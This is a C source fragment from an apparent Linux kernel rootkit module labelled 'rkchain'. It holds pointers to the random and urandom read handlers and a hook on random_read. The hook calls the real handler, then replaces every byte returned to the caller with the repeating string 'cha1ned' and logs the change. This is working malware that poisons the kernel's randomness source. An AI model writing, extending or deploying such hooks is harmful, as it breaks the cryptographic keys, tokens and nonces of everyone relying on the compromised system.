#include <linux/kernel.h>
#include <linux/printk.h>
#include <linux/slab.h>

static asmlinkage ssize_t (*random_read_target)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
static asmlinkage ssize_t (*urandom_read_target)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);

const char magic_value[8] = "cha1ned";

static asmlinkage ssize_t random_read_hook(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    char *out_chunk;
    int bytes_read, i;
    

    bytes_read = random_read_target(file, buf, nbytes, ppos);
    out_chunk = kzalloc(bytes_read, GFP_KERNEL);

    if(copy_from_user(out_chunk, buf, bytes_read))
    {
        printk(KERN_ALERT "[rkchain] failed to copy(from) %d bytes.\n", bytes_read);
        goto cleanup;
    }

    for(i = 0; i < bytes_read; i++)
        out_chunk[i] = magic_value[i % 8];

    if(copy_to_user(buf, out_chunk, bytes_read))
    {
        printk(KERN_ALERT "[rkchain] failed to copy(to) %d bytes.\n", bytes_read);
        goto cleanup;
    }

    printk(KERN_DEBUG "[rkchain] hooked random_read: changed %d bytes!\n", bytes_read);

cleanup:
    kfree(out_chunk);    
    return bytes_read;
}
